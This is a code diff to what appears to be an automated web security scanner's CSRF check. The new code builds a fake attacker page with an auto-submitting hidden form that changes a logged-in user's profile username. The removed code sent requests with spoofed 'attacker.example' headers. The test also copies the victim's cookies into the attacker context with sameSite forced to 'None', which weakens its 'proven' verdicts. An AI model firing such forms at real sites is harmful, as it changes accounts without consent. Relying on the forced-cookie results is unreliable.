@@ -26,6 +26,9 @@ const workflow = {
   csrfError: null,
   csrfProven: false,
   csrfEvidence: null,
+  csrfUsernameBefore: null,
+  csrfUsernameAfter: null,
+  csrfOrigin: "http://htmledit.squarefree.com",
   reflectedXss: false,
 };
 let cartRequest;
@@ -266,159 +269,139 @@ async function runAuthenticatedWorkflow() {
 }
 
 async function runCsrfWorkflow() {
-  if (!cartRequest || !workflow.csrfRequestCaptured) {
+  if (!workflow.authentication) {
     workflow.csrfOutcome = "skipped";
-    workflow.csrfError = "cart_request_not_captured";
-    console.log("WORKFLOW csrf_validation=skipped reason=cart_request_not_captured");
+    workflow.csrfError = "authentication_not_completed";
+    console.log("WORKFLOW csrf_validation=skipped reason=authentication_not_completed");
     return;
   }
 
-  let basketBefore = null;
-  let basketAfter = null;
-  const basketId = cartRequest.payload?.BasketId;
-
-  if (basketId && cartRequest.authorization) {
-    const basketResponse = await page.evaluate(async ({ origin, basketId, authorization }) => {
-      const response = await fetch(`${origin}/rest/basket/${basketId}`, {
-        headers: { Authorization: authorization },
-      });
-      if (!response.ok) {
-        return null;
-      }
-      const body = await response.json();
-      return body?.data?.Products || body?.data || null;
-    }, {
-      origin: targetUrl.origin,
-      basketId,
-      authorization: cartRequest.authorization,
-    }).catch(() => null);
-
-    basketBefore = basketResponse;
+  let usernameBefore = null;
+  try {
+    await page.goto(new URL("/profile", targetUrl.origin).href, {
+      waitUntil: "networkidle",
+      timeout: 30000,
+    });
+    const usernameField = await firstAvailable([
+      'input[name="username"]',
+      'input#username',
+    ]);
+    if (!usernameField) {
+      throw new Error("csrf_username_field_not_found");
+    }
+    usernameBefore = await usernameField.inputValue();
+  } catch (error) {
+    workflow.csrfStatus = 0;
+    workflow.csrfOutcome = "failed";
+    workflow.csrfError = error.message;
+    workflow.csrfValidation = false;
+    console.log(`WORKFLOW csrf_validation=failed error=${error.message}`);
+    return;
   }
+
+  workflow.csrfUsernameBefore = usernameBefore;
+  const csrfUsername = `csrf-proven-${Date.now().toString(36)}`;
+  const attackerOrigin = "http://htmledit.squarefree.com";
+  workflow.csrfOrigin = attackerOrigin;
+  workflow.csrfRequestCaptured = true;
 
   const attackerContext = await browser.newContext({
     ignoreHTTPSErrors: true,
   });
 
   try {
-    let response;
-    let body;
-    const requestOptions = {
-      headers: {
-        "Content-Type": cartRequest.contentType,
-        "Origin": "https://attacker.example",
-        "Referer": "https://attacker.example/csrf-test",
-      },
+    const victimCookies = await context.cookies(targetUrl.origin);
+    await attackerContext.addCookies(
+      victimCookies.map(cookie => ({
+        ...cookie,
+        sameSite: "None",
+      }))
+    );
+
+    const attackerPage = await attackerContext.newPage();
+    await attackerPage.route(`${attackerOrigin}/csrf-test`, route =>
+      route.fulfill({
+        status: 200,
+        contentType: "text/html",
+        body: `<!doctype html>
+<html>
+  <body>
+    <form id="csrf-form" action="${targetUrl.origin}/profile" method="POST">
+      <input type="hidden" name="username" value="${csrfUsername}">
+    </form>
+    <script>document.getElementById("csrf-form").submit()</script>
+  </body>
+</html>`,
+      })
+    );
+
+    let status = 0;
+    const navigation = attackerPage.waitForNavigation({
+      waitUntil: "networkidle",
       timeout: 30000,
-    };
-
-    if (cartRequest.postData) {
-      if (/^application\/json/i.test(cartRequest.contentType)) {
-        try {
-          requestOptions.data = JSON.parse(cartRequest.postData);
-        } catch {
-          requestOptions.data = cartRequest.postData;
-        }
-      } else {
-        requestOptions.data = cartRequest.postData;
-      }
+    }).catch(() => null);
+    await attackerPage.goto(`${attackerOrigin}/csrf-test`, {
+      waitUntil: "domcontentloaded",
+      timeout: 30000,
+    });
+    const victimResponse = await navigation;
+    if (victimResponse) {
+      status = victimResponse.status();
     }
 
-    switch (cartRequest.method) {
-      case "POST":
-        response = await attackerContext.request.post(cartRequest.url, requestOptions);
-        break;
-      case "PUT":
-        response = await attackerContext.request.put(cartRequest.url, requestOptions);
-        break;
-      case "PATCH":
-        response = await attackerContext.request.patch(cartRequest.url, requestOptions);
-        break;
-      default:
-        throw new Error(`unsupported_request_method=${cartRequest.method}`);
-    }
+    await attackerContext.close();
+    await page.goto(new URL("/profile", targetUrl.origin).href, {
+      waitUntil: "networkidle",
+      timeout: 30000,
+    });
+    const usernameFieldAfter = await firstAvailable([
+      'input[name="username"]',
+      'input#username',
+    ]);
+    const usernameAfter = usernameFieldAfter
+      ? await usernameFieldAfter.inputValue()
+      : null;
 
-    body = await response.text();
-    const status = response.status();
-    workflow.csrfTokenPresent = cartRequest.csrfTokenPresent;
     workflow.csrfStatus = status;
+    workflow.csrfUsernameAfter = usernameAfter;
     workflow.csrfEffectObserved =
-      status >= 200 && status < 300 && body.length > 0;
+      usernameAfter !== null && usernameAfter !== usernameBefore;
 
-    if (basketId && cartRequest.authorization) {
-      basketAfter = await page.evaluate(async ({ origin, basketId, authorization }) => {
-        await new Promise(resolve => setTimeout(resolve, 1000));
-        const response = await fetch(`${origin}/rest/basket/${basketId}`, {
-          headers: { Authorization: authorization },
-        });
-        if (!response.ok) {
-          return null;
-        }
-        const body = await response.json();
-        return body?.data?.Products || body?.data || null;
-      }, {
-        origin: targetUrl.origin,
-        basketId,
-        authorization: cartRequest.authorization,
-      }).catch(() => null);
-
-      const beforeCount = Array.isArray(basketBefore) ? basketBefore.length : null;
-      const afterCount = Array.isArray(basketAfter) ? basketAfter.length : null;
-      if (beforeCount !== null && afterCount !== null) {
-        workflow.csrfEffectObserved =
-          workflow.csrfEffectObserved && afterCount >= beforeCount;
-      }
-    }
-
-    const rejected = status === 401 || status === 403 || status === 419;
-    const inconclusive = status === 0 || status === 400 || status === 405 || status === 409;
-
-    if (rejected) {
+    if (workflow.csrfEffectObserved) {
+      workflow.csrfOutcome = "vulnerable";
+      workflow.csrfVulnerable = true;
+      workflow.csrfValidation = true;
+      workflow.csrfProven = true;
+      workflow.csrfEvidence = {
+        origin: attackerOrigin,
+        endpoint: `${targetUrl.origin}/profile`,
+        usernameBefore,
+        usernameAfter,
+        status,
+      };
+    } else if (status === 403 || status === 401 || status === 419) {
       workflow.csrfOutcome = "protected";
       workflow.csrfVulnerable = false;
       workflow.csrfValidation = true;
-    } else if (inconclusive) {
-      workflow.csrfOutcome = "indeterminate";
-      workflow.csrfVulnerable = false;
-      workflow.csrfValidation = false;
-    } else if (
-      status >= 200 && status < 400 &&
-      workflow.csrfEffectObserved &&
-      !workflow.csrfTokenPresent
-    ) {
-      const beforeCount = Array.isArray(basketBefore) ? basketBefore.length : null;
-      const afterCount = Array.isArray(basketAfter) ? basketAfter.length : null;
-      const basketChanged =
-        beforeCount !== null &&
-        afterCount !== null &&
-        afterCount > beforeCount;
-
-      if (basketChanged) {
-        workflow.csrfOutcome = "vulnerable";
-        workflow.csrfVulnerable = true;
-        workflow.csrfValidation = true;
-        workflow.csrfProven = true;
-        workflow.csrfEvidence = {
-          basketId,
-          productId: cartRequest.payload?.ProductId,
-          basketCountBefore: beforeCount,
-          basketCountAfter: afterCount,
-        };
-      } else {
-        workflow.csrfOutcome = "potentially-vulnerable";
-        workflow.csrfVulnerable = true;
-        workflow.csrfValidation = false;
-        workflow.csrfEvidence = {
-          basketId,
-          productId: cartRequest.payload?.ProductId,
-          basketCountBefore: beforeCount,
-          basketCountAfter: afterCount,
-        };
-      }
+      workflow.csrfEvidence = {
+        origin: attackerOrigin,
+        endpoint: `${targetUrl.origin}/profile`,
+        usernameBefore,
+        usernameAfter,
+        status,
+      };
     } else {
       workflow.csrfOutcome = "indeterminate";
       workflow.csrfVulnerable = false;
       workflow.csrfValidation = false;
+      workflow.csrfError = "username_unchanged";
+      workflow.csrfEvidence = {
+        origin: attackerOrigin,
+        endpoint: `${targetUrl.origin}/profile`,
+        usernameBefore,
+        usernameAfter,
+        status,
+      };
     }
   } catch (error) {
     workflow.csrfStatus = 0;
@@ -435,8 +418,8 @@ async function runCsrfWorkflow() {
     `WORKFLOW csrf_validation=${workflow.csrfValidation} ` +
     `outcome=${workflow.csrfOutcome} vulnerable=${workflow.csrfVulnerable} ` +
     `status=${workflow.csrfStatus} effect=${workflow.csrfEffectObserved} ` +
-    `csrf_token=${workflow.csrfTokenPresent}` +
-    (workflow.csrfError ? ` error=${workflow.csrfError}` : "")
+    `username_before=${workflow.csrfUsernameBefore} ` +
+    `username_after=${workflow.csrfUsernameAfter}`
   );
 }
 
